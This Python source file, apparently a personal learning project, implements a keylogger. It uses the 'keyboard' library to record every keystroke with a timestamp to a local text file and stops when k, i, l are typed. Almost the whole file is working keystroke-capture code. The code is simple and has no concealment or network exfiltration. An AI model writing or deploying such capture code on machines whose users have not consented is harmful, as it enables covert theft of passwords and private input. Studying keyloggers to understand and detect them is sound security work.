#|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|#
# Author: Cole Baker
# Start Date: January, 23, 2019
# Finish Date:Febuary, 08, 2019
# Description: Key logger with Array - The way this program is set up is that only the characters listed in the
# 'kill_command' list can be added to the 'kill_array' list. The characters logged that match the characters from
# 'kill_command' can only be inserted into their relative positions within the 'kill_array' list, ie 'k' in pos 0
# of 'kill_command' can only be placed in pos 0 of 'kill_array'. A logged character can only get to that point if
# 'logged_keys' is equal to a pos in 'kill_command', ie only an 'k', 'i', or an 'l' can be set to be added to the 
# 'kill_array'.
#|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|#

import keyboard 
import datetime
import logging

# Escape characters array
kill_command = ['k','i','l']
# Empty arrary to append typed keys to which are the compared to the kill_command array
kill_array = []

# File path for the logged keys file, and file access mode
file_path = "C:\\Users\\baker\\OneDrive\\Documents\\My Stuff\\Personal\\Security Stuff\\security_stuff\\Key_Logger\\array_logged_keys.txt"
access_mode = "a"

# Opening file and accessing it using access mode above
file_handle = open(file_path,access_mode)

# Start of while loop for reading keys pressed
while True:
    # Using the keyboard function read_hotkey to read keys pressed
    logged_keys = keyboard.read_hotkey(suppress=False)
    # Date and time set to be recorded to file(accurate to 2 milliseconds)
    date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-4]
    # Writing each key pressed key along with date and time to the array_logged_keys.txt file
    file_handle.write("{} - {}\n".format(date,logged_keys))
    
    # if logged_keys != kill_command:
    #     kill_array = []

    # 'if' statement to insert only an 'k' in pos 0 of the 'kill_array' list, so that it is equal and the same as pos 0 of the defined 'kill_command' list
    if logged_keys == kill_command[0]:
        kill_array.insert(0, kill_command[0])
        # kill_array.pop(1)
        print(kill_array)

    # Basically the same thing as the 'if' above, except now taking the pos 1 of the 'kill_array' and making sure its the same as pos 1 of 'kill_command'(i)           
    elif logged_keys == kill_command[1]:
        kill_array.insert(1, kill_command[1])
        # kill_array.pop(2)
        print(kill_array)
    
    # Final 'elif' that will make sure pos 3 in 'kill_array' is equal to pos 2 of 'kill_command'(l). As we as deleting any character after pos 2
    # in the event that there is more then one of the allowed inputs
    elif logged_keys == kill_command[2]:
        kill_array.insert(2, kill_command[2]) 
        #if logged_keys != "p":
            # kill_array.pop(3)
        del kill_array[3:]
        print(kill_array)

    # This 'if' is to check to see that when 'kill_array' is equal to 'kill_command' that the program breaks and ends
    if kill_array == kill_command:
        break
